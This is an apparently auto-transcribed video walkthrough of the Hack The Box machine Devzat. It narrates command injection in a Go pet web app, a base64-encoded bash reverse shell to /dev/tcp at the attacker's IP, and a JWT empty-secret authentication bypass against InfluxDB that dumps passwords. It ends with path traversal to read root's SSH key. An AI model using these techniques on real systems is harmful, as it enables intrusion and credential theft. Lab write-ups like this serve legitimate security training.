 what's going on youtube this is ipsec we're doing devs at from hack the box which is all about just exploiting golang binaries there's nothing too specific like a go server-side template injection or things like that it's just a lot of applications that will written and go that you exploit and do some source code analysis on it starts off with a web server that explains what devsat is which is an open source chat application that runs on top of ssh you can just ssh to port 8000 and with any username and join the chat room there's not much you can do there the first step of the box really is running virtual host enumeration on the web server discovering the pet sub domain which is a custom girling application that is vulnerable to a command injection vulnerability with the shell on that box you discover there's influx db listening on localhost which is a database written in girling it's running a vulnerable server that has an authentication bypass so you can dump all the connections out of there switch to the catherine user where you get access to a dev instance of the ssh chat application that has a lfi vulnerability they can use to read the ssh root key so with that being said let's jump in as always we begin with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it devs at and then the ip address of 1010 11.118 this can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22 and it's running on an ubuntu server we also have http on port 80 and is running apache httpd also on ubuntu and then this one's weird we have ssh running on port 8000 and it's banner tells us it's just a golang server and we also have host the ssh host key which is different than the host key for the ssh server and just knowing girling it's got a really cool feature where it has its own built-in ssh server much like python has a simple http server you can just spin up a ssh server and go link and um have user input and output that way so i'm guessing that's what this is going to be also the host name dev zap is a open source application i saw on reddit a long time ago we just google github devs at it's a chat application over ssh which is really cool but let's go take a look at the webpage so devset.htb and um we have to add this to a host file so sudo vi etsy host and if you're curious how i know this it came from that nmap scan of it redirecting so devsat dot htb we want to pull up the nmap right here this did not follow redirect so devsat.htb and we get a page looks like it's just a single page application talking about this and how to use it we just sh-l with a username over to devsat so i'm going to do ssh l ipsec port 8000 devs at htb accept this and we can see chat so we have a few users we have catherine root and patrick and admin so we probably want to take notes of all these users uh catherine running file and then a shrug not sure exactly what she's doing there we can send a message like hello we can do i think slash help and get commands or slash commands to get commands uh we could do slash room we see we're in maine um if i do slash all surprised it doesn't show catherine or whatnot um it just says admin ipsec let's see what else can we do we'll probably change our name to patrick uh it's reserved for local use so we can't use that name i was gonna do that because up here we saw patrick so maybe i could like take his name and then get his dms or something it's just one of the things i would be looking at but before we go any deeper in this application we probably should set up some type of recon to have running in the background so i'm going to try to fingerprint this if this is index.html it is i was hoping it would be php because we could find other php scripts but this is probably just a um [Music] standard static website so there's not much we can do here um we can try like dot get to see if there's a git repo maybe like robots.txt but nmap would tell us about that so there's really nothing we can look at um that's why i'm going to start with a virtual host scan i guess we could go into the source code see if there's anything interesting here or maybe we just run a durbust here and get lucky with like a slash backup directory but um i'm going to try virtual host first so i'm going to do go buster uh v hearst and then dash u http devsat.hdb word list file we'll do opt set list discovery dns subdomains of 5000 should be fine and we'll do outfile go buster dot vhost dot elk and we will run this and oh god everything is being found um so after this we'll probably have to filter out 302 we could also filter out 302 within go buster i believe like we could say let's see go buster v host h there should be a flags option that we can use to specify cookies follow redirect see random agent url let's see pattern output string i know there's a way to do it in gearbuster i've done it before but this is why i like the file instead of spending time looking at the output we can just like grep dash v to exclude and say 302 and we see there is another directory pets.devset.htb so um we went back to the top of this go buster we could see i was hoping it would say headers that are accepted i wonder if that works for dr mode this is a random rabbit hole i'm going down but this is exactly what i do when i'm doing all this stuff for the very first time like my application's not behaving like i expect it i dig into it and see so i would expect to see something here specifying what an accepted header is um that's changing the method timeout url string wild card i'm sure if you go in the youtube comment someone's going to tell me what this flag is but if i run this go buster with dir mode let's see what exactly happens i just want to see if it says flag because i may be crazy but i remember maybe it's w fuzz that says oh negative status codes that is what i want um is that up here go buster there's no negative status code up here when i do a viho scan so maybe that's something specific to dir that needs to be ported over to v host or maybe i'm just using the tool wrong but dir h it would be dash b so this dash b flag i think needs to be in v hearst and it's very possible it's there now and i did not update go buster but let's move on we have pets dot um devs that dot htb so let's do v etsy host pets.devsat.htb and we can take a look at so pets.hdb and we have a webpage awesome so i wanted to try to fingerprint this so index.php that's found so maybe it's a php site uh html uh something so it looks like everything is redirecting me to this my pets thing so me fingerprinting it did not work so it's got some type of uh oddity there i'm just going to examine the headers so let's turn intercept off we can do burp sweep send this over and we see it responds 200 okay the server is my genius go pet server so i'm guessing this is a golang web server which again just like the ssh it's got a built-in um web thing so go does good web servers um the only user input is this name of pet but again in the spirit of having recon go in the background let's do something here so go buster dir we don't want to [Music] do a dns discovery we're going to do web content and then wrapped small words dot text and we'll do go buster dot um pets.dry.out sure so now that that's running we can take a look at this user input name a pet i'll call it ipsec and we'll just add this and examine the request so intercept on let's send it over to repeater we send it and it says pet was added successfully and if i go back to this page uh maybe it only lasts for a short time refresh we can see ipsec and it has the characteristics of a cat so bit odd here we have another user input item here on delete so i'm going to see exactly what this looks like so intercept on delete not implemented so we can't delete uh go back to repeater we probably want to see if we can crash this page so i'm going to put a few bad characters that are known for like databases and nothing works there i'm gonna go google ssti payload uh detection maybe and i should turn rip suite off see ssti payloads this cobalt page is the one i normally grab let's see there is a long string see if this thing crashes the server and i say crash the server because it's not really outputting much user input back i guess um whoa that is weird let's see species cat let's just copy this oh it's got a bad character here escape that there we go so i can just go to escape double quotes because i'm within json like this okay we send it invalid period and string escape code so it doesn't look like it wants that that was added so something with a period potentially if i look at it let's do it quickly doesn't look like it's ssti um we have exit status 2 which is bizarre um so we crashed it somehow because it's not doing this characteristic thing somehow we overwrote into this um what i'm going to do is erase these like one at a time and see what ends up doing it that's still status two get rid of that status two i wonder if it's in my name status two it's not anything status two status two this is just cat oh i wonder if species does not exist you get that message exit status one so i don't know what those statuses are but we can get status one and two somehow which is bizarre going back over to our go buster we can see other directories we got images assets server password ht nothing yet really so let's see let's just try the database escapes again now that we see output here we'll probably see some type of exit status because this specie does not exist exist as two but nothing so we're kind of at a loss for what is going on here if i do a semicolon that is interesting so if i don't do a semicolon we see having a cats like a shared department and then if i do something after this so like cat a we have exit status one but the semicolon it's still species cat and what i'm thinking happens here is we have some type of injection on this species because in bash or any like in a shell command um cat and cat semicolon would be the same thing like if i go here and type echocat and type echocat semicolon they behave the same so i'm going to try sleep plus one let's do sleep space does that work there we go i did the plus because of url encoding but apparently we don't and we can see if i look in the bottom right everything's taking one millisecond if i do sleep two we should see this take two or not uh one thousand milliseconds now it's taking two thousand milliseconds so we have confirmed um code injection this way and i did not actually mean to find that blind like that because the actual challenge i know has a dot get directory but my recon hasn't told me that yet so um did i just miss it nope maybe this word list doesn't have dot get because the intended way which we'll go into is dot get like that but if you just do a special character fuzz it does stand out and you can eventually um find it so let's see crap dash ri dot get on this and let's see if it exists it does so eventually um i would have found it as long as i didn't make a stupid mistake and do devs at hdb not pets so go buster dir oh this is now interesting so because every page returned with a 200 um go bus is broken so if i add dash dash wildcard we'd probably have to do this and grep out size 510 so if i had done this box more beforehand i probably would have switched tools and didn't use go buster here because it's obviously not ideal in this size in this state maybe something like ferro buster would be better um but fight grep v 510 on gobuster.pets.dir.out we can see the status code here so maybe the answer well if we made like blacklisted 200 then we wouldn't find files so i guess this is what you're supposed to do if you do it with go buster is go this way but we see the dot get directory and also if you end mapped after you created this hostname i think it would have showed it but we have not get we can do a tool called get dumper so it's in my op directory already because i've used this plenty of times before but if you don't have it you can just do github get dumper and it should be the first result yep i told a jump a git repository so oh it's also a pip do i just have that if i do get dumper let's do pip 3 install get dumper does this install get dumper sweet we can do it this way so we specify the url which is going to be this petsdevset.hdb where is it go back here it is and then the directory want to store it which i'm just going to do get so let's make this directory and now it is downloading this get file and we'll have the source code to the web application so we can take a look at exactly where this vulnerability was so we have go mod go sub main.go i'm going to start with main.go and the main thing i want to look at is um where user input is so i'm just scrolling down and right here we can see the exact um injection but we could see this and go off here because we see shell dash c and then cat characteristics plus the species but i'm not really satisfied with this because even though we'd know this answer we didn't really learn anything other than a specific vulnerability to this application like i want to know exactly how user input gets here because normally when i do static code review i always look for all the areas where there's user input and from this one function that i'm looking at i don't know how user input got here so i'd be keeping going down and it looks like whenever i include this http dot request we have user input in that function so what i would do is grab http.request on main dot go it's probably like a capital r yeah and then go through each of the functions that turn up because this is where we can potentially include things so i'm going to look at get pets so we can do get pets and right here um i don't really see it using user input we just have it writing to the web request right it's never loading something if i look at add pet which is the next one so if i do add pet we can see it reading the request right here with this i o util read all and then r dot body and then we create the um i guess structure or something pet named ad pet and right down here this thing json.onmarshall we're taking the request body that we read right here and then sending it to this ad pet variable and let's see if the error is if there's an error we write the error and then we do add pet dot characteristics is equal to load character add pet dot species so this add pet dot species is the exact thing right here the species thing here so this is the user input that we're writing and then we look at the load character function and we see the command injection but because we've traced this whole application if that wasn't vulnerable or there was a second vulnerability in it maybe that was just lfi because that is also an lfi vulnerability because if we do that cat let's see it's where is it come on um load here we go so let's say um semicolon was a bad string maybe they had something here doing some type of filtering and semicolon was a bad string and we missed that vulnerability well it's still a local file inclusion we could test for that so instead of cat we can try slash because we did speech we're going cat this file or this directory this file so we turn that into that file into a directory so now we can do a normal directory traversal of dot slashes and passwd so if i do that we go back to this page so hit this refresh um maybe we don't want to specify a file let me just do a directory traversal there come on is this going to be vulnerable i don't see it that is bizarre let's see it's adding me into species i wonder if we need like the exact number of um slashes come on i'm gonna try oh i don't have etsy the stupid mistakes you make when you talk and type there we go etsy past wd and we have the file i wonder if i had cat if that would work so if i did it like this how does this work is that no file yeah no file so i did that because every like program language is slightly different i think in java this may have worked and there's some programming languages where if you open a file and you're at slash and you do dot dot slash it errors out so you would have to know the exact number of dot dot slashes in order for it to behave as you're expecting an lfi but those are just the things you kind of learn with experience and me doing that task you saw i just removed one of those directories and the lfi still worked so i know um this application isn't like that and there we go so we can guess exactly where the um file is by knowing the exact number of slashes so this is another enumeration you can do with an lfi come on so let's try one more there we go so we know there's four directories before we hit the root directory so var dub dub dub html pets is what i'm thinking right uh we can confirm we're not in etsy because we could remove one and this is going to break it right and we no longer have the lfi but we can get rid of etsy and if this application was running somewhere in etsy we'd be able to read this file because going up these three directories would drop us in the slash etsy directory but that's not the case so that's a lot of um extra stuff for something we knew we had rce in but that's generally like the thought process i go around and why even after i find the rce i dig a bit further to um find a potential like how it works because there may be something you're missing and if you go digging down one rabbit hole too long without exploring all the holes you may just waste a lot of time because it doesn't take that much time to cast your net wide so i'm going to do echo dash n we can do bash dash i actually just bash dash let's see yeah bash dash i and then dev tcp 10 10 14 8 0 at end one like this and then we can um base 64 encode this and i want to get rid of the pluses just because i hate dealing with url encoding i doubt it would be an issue but um did i make a typo here somewhere yeah i did it's also a good sanity check for me because i knew just in that one space would not work i forgot the port here but um i hate troubleshooting issues because of encoding so when possible like i tried to remove all possible errors like we can test it out by just sending this payload first so if i send this let's see if it'll work with this so copy we can go here species semicolon echo dash n our string base 64-d pipe it over to bash we can do nc lvmp 9001 send it we got a shell so doing this whole url encoding thing doesn't help us in the least here because it worked beforehand but if we did have an error something like this would prevent us having that error and wasting time because if plus is a bad character because the server does some url encode breaks the base64 by adding this plus like converting the plus into a space the server did that we break but just a pure alphanumeric payload is often going to be much more reliable than anything else so that's why i take those like 10 to 15 seconds to convert my reverse shells when i do a base64 cradle like this and let's see as i say i had an error message because i thought this would be like foolproof and i wouldn't make a mistake here but apparently i did i devtcp 1010 14 8 9001 nope that looks correct i wonder if i screwed something up here let's just retype this whole payload so echo dash n paste this base64-d bash there has been an error invalid character r at the beginning of object string i have oh i added res here where the species is so that was my issue here's me just screwing up the request but now i'm in this pets directory with patrick so let's get a proper shell python3 c import pty pty dot spawn bin bash ctrl z stty raw minus echo and i'm also going to do semicolon fg and now we should have the up arrow and i can also clear the screen if i do export term is equal to x term there we go so we did kind of miss one type of enumeration step that i would normally be doing and that is looking at the uh get files so we have this get directory we could do git log and we could also go back to like the init commit or do like get diffs against these to see if there's anything we really missed maybe there's a different hard coded credential an ssh key or something like that i don't think there is you could also do it on this box as well because we just downloaded it off this web server but generally um this is an ssh application and when i tried to switch my nickname to patrick i do ssh-l patrick p 8 000 10 10 11 158 i believe was the port or the hearst maybe it's 153 what is devs at i can just do it off of um the host name right devsec.htb that's why dns exists but we have nickname is reserved for local use so we could potentially go into his ssh directory see if there's a private key which there is so i can cat id rsa we can copy it over to my box and see if we can now get on as the patrick user so we can do vi patrick dot key paste it in chmod 600 and then that same ssh command but this time do a dash i patrick.key and it still says reserved for local use so oh now with the name exit oh that's funny it's slash exit to exit um it says local use so i'm gonna try ssh dash l patrick and then 127.001 i've got the port of 8000. except the key and we get in as patrick and something weird happened that was weird says patrick admin patrick admin and it's not telling us text let's try this again and still doing the same thing see i p adr i want to say those are supposed to be messages between patrick and admin i don't know why they aren't 10 10 11 118 yes this box is behaving very oddly we can try like ssh as a different user so i'm going to leave this as 12701 and i'm going to try logging in as admin and we still see some messages i'm going to try switching to ssh so s h dash i patrick.key patrick at devsat.htb we should be able to log in as him with this key so we're not doing a reverse shell s-h-l patrick dash p 8000 12701 so we can see something weird happening um if we do it from ssh we see text if we do it from the reverse shell we do not see any text my guess is this is probably being transmitted over like unicode or something like that and reverse shell just drops that whole text it's really bizarre i did not expect this behavior but now we can see the message from patrick and this did show me something interesting i think we can impersonate other users but reading this we see the admin setup influx db and says be sure to check it out and patrick says yes he's on an admin leaves so i'm going to try ssh admin what happens if i do this does it prevent me from logging in as admin nope it still says i'm now admin and we have the message the other user was catherine so we can probably impersonate catherine because it's not asking of his passwords and we can see a message from patrick and it says hey catherine glad you came and it's talking about them implementing a local dev instance on port 8443 so there's two things on this box that we want to look at whatever influx db is and also port 8443 so i'm gonna do ss lntp i think a and let's do less dash s so we get rid of this weird line wrapping because i just hate it i like it like this better so i can go right if i want to but let's see we have eight four four three here we can't really see any information about it uh there's 80 86 let's see we know what 22 is 5 000 is running pet shop so we know that uh python three on five seven three two two okay this is my uh reverse shell we see it calling back to me on 9001. oh that's another ephemeral port this is ssh 472 it's in time wait not listen so i'm not that interested in it that was probably um me connecting to the dev chat instance so there's two ports we want uh eight four four three and eighty eighty six so if i do a let's see do we have nc we do not have nc uh we can probably just curl so curl 12701 8086 404 page not found so that's a web server and then the other one was eight four four three so we can do eight four four three we probably have to do like dash k https i would think uh wrong ssl version number that is weird um we can do sh-l and do patrick and then dash p8443 yes so this is running ssh and it's a different chat server so um slash commands there we go and we can look at the difference between the two chat servers so if i do sh l name doesn't matter slash commands uh let's just exit this reverse shell we can do ssh-l uh with patrick we don't need that we can just do ipsec and we can do slash commands here and see there is an extra command called file and it's an alpha so it paste file directly to the chat if i do slash file we can do etsy passwd and it needs us to provide a password so we don't have the password um we'd have to be able to like find where this binary is running or um like create a brute forcer and try to brute force the password or find source code somewhere on this box but the first step we can do is this influx db that was on port 8086 so i'm going to add the dash v flag so i can see server headers uh not capital v i want lowercase v and we see we've confirmed it is influx db running version one seven five so if i go to exploit db and we can also do search plate on our box um i just like using exploit db when i can because i know it's going to be up to date we can look at influx db and we have no searches found so try just influx nothing so i can go like google um influx db exploit see if there's anything on google we have this github repository i'm probably not going to look at it too much because it was i think created for this box or around the time of this box i see it updated february this may be when the box released so i try to avoid those type of things when doing videos we have influx db enumeration utility from 2018 uh we have this thing on hack tricks the one thing i missed is we can do influx db one seven five change log and i like doing change log because this gets me the date things were released so let's see that's one eight is there a 175 entry so 175 2019. so if we look at the next version up we can see what happens bug fixes ensure credentials are correctly pursed when executing flux http request this sounds interesting fix panic add version we can maybe search this for security security level these are old um so it looks like there may be a bug with authentication fixed uh i think sync may have something i think i pronounced that correct if i do sync influx db this is just another like vulnerability database and this is looking at the npm package i don't want that let's just see if we can find it this way influx db we can search let's see that's grafana improper authentication here we go so if i click on influx db to look at this package we see this does it say what version it was fixed i may have to sign up to see that information oh no right here influx db before 176. so we can find it either way um if we're lucky we find some type of report that says something like this like authentication bypass before 176. that is obviously um pointing us to the right thing if we do influx let's see where's that change log if i look at my history today 404 oh come on is it not there release notes there we go so one seven six i'm guessing uh ensure credentials are correctly passed is code name for the developer saying there was an authentication bypass so the other place i would go to once i know there's a vulnerability i'm looking for is their github page because this is an open source database so i'm just going to do a github search on influxdb if we search this we can go here look at the issues and we want to look at closed issues and i'm going to search for like password authentication and if we scroll around probably a 2019 time frame here we go we have one tagged as security i can click on the security tag also and see every um security vulnerability so if we don't search by password authentication just look at label security this could also be another good way to find vulnerabilities that would be vulnerable too but this password bypass vulnerability says we can authorize any user as long as we have a empty shared secret in our jwt token and goes on explaining why um the one thing i do want to point out is when we make a jwt token we also need to know the like structure of the token so in here i'm looking at the source code this is where the person linked me to and i'm specifically going to look at it assign the claims so it's looking for the exp which is expiration uh username from the token and that looks like it is it from the jwt token so we just need to create a jwt token with an empty secret that has a username and expiration so i'm going to do jwt dot io and let's see we don't need whoops this sub which i think is the subject but they use name or username right uh was it username let's go back here claim username so that's what they use and we know the users are going to be joe catherine or admin if i'm impersonating anyone i'm going to impersonate admin first and then expiration it's probably just going to be a epoch time so exp and we want to get the current epoch time and then add something to it so current epoch time uh go to google i guess click on this get this time this is just time since the epoch which is like 1960 i believe uh when did epoch start january 1st 1970 it was 10 a decade off so this is in seconds i'm just going to say we'll change this to a 2. this is gonna be really far into the future so let's see we can probably go to epoch converter um do we have it right here if i put what i put in we're now let's see i made it oh that did not get as far in the future as i thought but let's see current timestamp is this so 520 457 and what did i change it to we may want to go even further because we don't want the token expiring on us when we're doing this video i thought a two in that spot would work fine yeah there's only like three hours so i'm going to change this one there we go we're a few days monday march 14 2022 so this will be a few days i'm creating this video on friday so if you're watching this the day it goes live i recorded it yesterday uh where's jwt right here paste it in and our secret is blank i'm going to uh we don't know if it's encoded or not i wonder if i could quickly find that from the source code see does this base64 let's see encode i don't know how golen's doing it i want to say i need to include this if it doesn't work i'd grab the secret without it base64 i find it funny that uh base64 encoding oh wait it's not blank it had data there there we go it doesn't matter because there's no signature it's just blank that's what i expected so we can grab this and let's see um we got to look at influx db example request how to write data to influx db let's see curl api here we go so we want query uh we probably don't want to create database see authorization token username colon password we're probably going to use something called bearer i believe but let's see right db show databases api and we can get i guess an example here it still says db but i'm going to just play with this real quick and see if we can get to show databases without using this query well without something let's see we got the curl we're hitting slash query saying pretty true we just ran this unable to process authentication so i'm going to add the header i'm going to say authorization bearer and then the jwt token and this is just the standard way you use jwts if you look at like the hack the box api you'll have a bearer token and oh god i just pasted it again when i did not want to authorization b-e-a-r i think that's it there we go and database not found so we're making progress um i'm going to make this a bit easier to use because i don't want to have to keep using this curl query let's see cd dev shm v query dot sh paste this in see we can get rid of data url in code db equals my db and then we can just do this and i'm going to try just putting dollar one here which in bash should put the first argument so if i um chmod plus xquery.sh you probably want to put the shebang in then bash so i can now do dot slash query and if i do show databases does this do anything show database missing parameter q let's see i probably want to do q equals because i had deleted that so q equals would be query equals let's see person query expected i probably should put this in quotes because i ran a show command but how i did it because i just did argv one and bash it only sent show to it so wrapping it in double quotes shows me things so now we have the databases devsat and internal so we can modify our query back to how it was and say data url and code db is equal to mydb instead of that we put devs at or internal but i want to look at the devs at so i'm just going to modify this and we can say devs at and i also want to try something real quick feedtest.sh echo i think i do that see bash test.sh hello world okay that's all arguments so before i'm just using dollar one if i run this it just says hello if i put it in quotes then bash knows that whole thing is my first argument but if i just want everything i can just do dollar at and that works fine so i'm going to edit query to switch to dollar at there we go so now if i do query we can do show measurements is i think how you look at tables in influx db let's see show measurements i probably have a typo there we go wait what show measurements could not resolve host still wanted in quotes what i'm not going to pretend i know what that's happening i have no idea but we can see this show measurements has a table of user so i can probably do a select star from user uh unable to do i need a semicolon let's see error person found name let's see if i echo that first i'm passing the whole thing i thought that would be it file name expected identifier string so we do select star found user expecting identifier let's try putting this on google see 15 we don't need that line okay oh um influx db oh wait cannot create a username with name user create user password with all privileges i wonder if we have to do it in quotes let's see create database username yes it's doing it in quotes and they say specifically say double quotes i'm gonna try a single quote get rid of that semicolon so i wonder if we escape it and put double quotes there we go so that was it um the reason why we had to escape it is because we have this in quotes as well i wonder if i did not do that if i use single quotes on the outer do it this way then it would work as well so if you didn't want to escape it you could just do single quotes on the outer and we have three things um wilhelm is password willy wonka i'm guessing and i'm guessing this is enabled because we see charles and catherine have true here one is false i don't know who this is maybe this is the administrator's name um i don't see patrick either so username password enabledtime so catherine exists on the box i don't know who charles and wilhelm is they're not on this so i'm going to try s u to catherine and then paste her password and we get in and that's where user.txt is we can do lsla there is a ssh but no private key so at this point when we do sh-l catherine we can look at this message again so let's see port 800127001 sure and we get the message from patrick saying um could you connect to a local dev instance you'll need the password i gave you last time patrick saying he left the source for your review and backups and that's it so whoops paste that password again hopefully i still have it on clipboard oh shoot i see you dash paste i don't think i have that password on clipboard um select oh that is her password help if i specify i want to go to the catherine user so we have to find where those backups are we can probably do a find dash and say dash user catherine and then pipe all error messages to devnull and see what we find a lot of things in proc so we can also do ls if we want to show ls probably has to come after the user it's really weird because we can see root root there's no reason i should see that with dash user catherine so you want to do the dash ls flag last and the find command then we could also grab dash v proc because we don't care about that um grab that v proc after the direct and we can see all the files owned by catherine there's devs at main and devs at zip so we have two files here we probably want to send them over to our box and we can see only catherine can read and write to it so i had known that ahead of time that's why i didn't go hunting for this file when i was the patrick user just because um hindsight told me not to because i knew that i remembered this piece from before but we should download these files server backups and we can let's see python 3-m http server we'll put it on 8001. i should be able to download them so wget devs at hdb 8001 slash desert main and devset zip okay so we have both of those let's stop this web server and then let's do maker source slash main comma zip we have to add a dash p because the source directory does not exist and i'm going to go main unzip devs at main.zip and you guess it i'm going to go into dev i thought i'd create the dev oh mv zip to dev and we can unzip devs at dev.zip so now we have two files so the next thing i want to do is let's see what could we do to diff these we could probably find a way to dip folders um see we can do also find dot then exergs so we might just exec is equal to md5 sum i think like that see if i just exact md5 sum dash exec md5 sum there we go uh we probably want dash type f for files and then we can arc print one so now we have just a list of md5 files and if i sort dash or sort md5s and then unique dash c and we only want the md5 sums that have a one so now i can arc this and this is probably a horrible way to do it um it's a weird way that like i always do it um again never sure if this is the optimal way so now we have a list of unique md5s so we can go back to our exact command get rid of that awk so now this output is just let's see find that okay we can grep dash file unique md5s uh that's not what i wanted to do there we go lowercase f so this is a list of all the unique files if you could follow that weird train of logic but we probably only care about dev and we have all users dev chat commands and test file i'm going to look at what test file is uh don't know maybe that's the file they're including because remember when we ssh to port 8443 there was a file command that looked like you could include files so maybe test file is related to that we could probably grab dash r test file on dev it doesn't exist so that's not hard coded anywhere we can also do a diff dev dev commands dot go and main main commands dot main all right dot go and see what is different here um guessing all these lines are in the new so yeah command file paste file contents so we want to look for where the password is and we have it right here so pretty much done so we got the password we just want to look at how that works so let's see command dot go here's a password so this is what's checking get cwd print path so here's it opening os stat on print path so i guess we just have to figure out what user this is running as because it's going to print the contents of this file whatever we specify so let's go back to catherine sh dash l doesn't matter who we are um ipsec just managedly specify the port 8443 and we can say file etsy passwd paste in the hard coded password and i thought that would work see help oh i just made a big no-no um i'm sending the message to chat so anyone in this chat room would see my command see so i do file it says the requested file root devs at etsy passwd does not exist so if i do dot slash dot dot slash we get passwd we could also grab the shadow file and we could also check if root has a ssh key so id underscore rsa let's see file root devs at so we just want to go up one directory so doing up one places us at slash root that is a small key but let's grab it okay v let's go up to directories three directories v root dot key paste it one two three four five six seven eight nine so i just hit nine x and we can delete all these lines chmod 600 root dot key s h dash i with it 10 10 or let's just do devs at hdb and we get in so there you have it that is root on this box i was kind of curious about let's go back in that dev source so let's see um source dev dev v commands dot go um there we go here's the password okay oh so here's where it gets that root um devset thing we're doing a cwd and then print path is joined cwd plus path i was kind of curious why i couldn't just specify etsy pass wd where it was getting the root devs at thing and that is this line of it just making print path the combination of cwd plus path so hope you guys enjoyed the video take care and i will see you all next time